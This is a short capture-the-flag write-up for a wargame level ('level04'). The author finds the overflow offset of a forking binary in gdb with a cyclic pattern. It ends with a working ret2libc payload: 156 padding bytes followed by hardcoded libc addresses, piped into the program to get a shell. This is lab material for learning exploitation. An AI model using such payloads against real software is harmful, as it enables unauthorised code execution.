The project wants shellcode from us, but this is ultimately our challenge :D. I'm going to keep it simple and do ret2libc because, for reasons I don't understand, it seems easier to me. I'll start by figuring out how many bytes I need for everything, but there's an important point here: we're now working under a child process, so I need to do the process I found on Stack Overflow.
```
https://stackoverflow.com/questions/15126925/debugging-child-process-after-fork-follow-fork-mode-child-configured
```

```
set follow-fork-mode child
```

Then everything will proceed as usual...

```diff
+(gdb) set follow-fork-mode child
+(gdb) r
Starting program: /home/users/level04/level04
[New process 2919]
Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2919]
+0x41326641 in ?? ()
(gdb)
```

```
Offset: 156 (0-based)
Interpretation: hex (little-endian) ascii

https://lujiangz.github.io/tools/pattern/index.html
```

```
(python -c 'print ("A" * 156 + ("\xd0\xae\xe6\xf7") + "aaaa" + ("\xec\x97\xf8\xf7"))';cat) | ./level04
```